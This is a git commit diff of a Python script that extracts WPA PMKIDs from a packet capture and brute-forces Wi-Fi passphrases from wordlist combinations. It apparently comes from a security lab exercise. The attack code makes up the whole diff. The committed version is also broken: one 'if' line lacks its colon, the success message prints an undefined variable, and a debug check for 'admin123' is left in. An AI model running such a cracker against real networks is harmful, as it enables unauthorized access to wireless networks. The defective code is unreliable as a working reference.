1eabc1ad8f4bee538882a7071a5f83e906a1eb7a
nathan.seville <nathan.seville@hotmail.ch>
2020-04-27 21:45:32 +0200

    clean

--- files/pmkids.py
+++ files/pmkids.py
@@ -6,6 +6,7 @@ from binascii import a2b_hex, b2a_hex
 # from pbkdf2_math import pbkdf2_hex
 from pbkdf2 import *
 import hmac, hashlib
+import itertools
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap('PMKID_handshake.pcap') 
@@ -18,7 +19,7 @@ def normalizeMac(mac):
 def findSSID(packets, apmac):
     for packet in packets: 
         # The SSID is advertized in Beacons
-        if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and normalizeMac(packet.addr2) == apmac:
+        if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and packet.addr2 == apmac:
             #print(normalizeMac(packet.addr2))
             #print(apmac)
 
@@ -32,10 +33,9 @@ def findPMKIDs(packets):
 
     for packet in packets:
         if packet.haslayer(EAPOL):
-            # Tuple with PMKID, Client MAC, AP MAC
-            #print(packet.addr1, packet.addr2)
-            PMKIDs[normalizeMac(packet.addr2)] = (packet[Raw].load[-16:], normalizeMac(packet.addr1))
-            #PMKIDs[packet[Raw].load[-16:]] = (normalizeMac(packet.addr1), normalizeMac(packet.addr2))
+            ssid = findSSID(packets, packet.addr2)
+            if ssid != None
+                PMKIDs[ssid] = (packet[Raw].load[-16:], normalizeMac(packet.addr1), normalizeMac(packet.addr2))
 
     return PMKIDs
 
@@ -46,11 +46,7 @@ def PMKID(key, ssid, staMAC, apMAC):
     key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
     return hmac.new(key,str.encode('PMK Name'+str(apMAC)+str(staMAC)),hashlib.sha1).digest()[:16]
 
-print(findPMKIDs(wpa))
-
-import itertools
 # Read dictionnary words
-#words = open('wordlist.txt', 'r').readlines()
 words = [line.rstrip() for line in open('wordlist.txt', 'r')]
 
 # Max combinations of words
@@ -58,15 +54,10 @@ maxc = int(input("Enter maximum words combinations [Int]: "))
 
 APs = findPMKIDs(wpa)
 
-for ap in APs:
-    ssid = findSSID(wpa, ap)
-            
-    if ssid == None: # Not an AP
-        continue
-
+for ssid in APs:
     for i in range(1, maxc+1):
         for key in wordCombinations(words, i):
-            pmkid, stamac = APs[ap]
+            pmkid, stamac, apmac = APs[ssid]
             
             #print(key)
             #print(str.encode(''.join(key)))
@@ -74,10 +65,10 @@ for ap in APs:
             if 'admin123' in ''.join(key):
                 print(ssid)
                 print(''.join(key))
-                print(PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, ap))
+                print(PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac))
                 print(pmkid)
 
-            if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, ap):
+            if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac):
                 print("Found passphrase ", word, " for AP ", ssid)
                 break
             
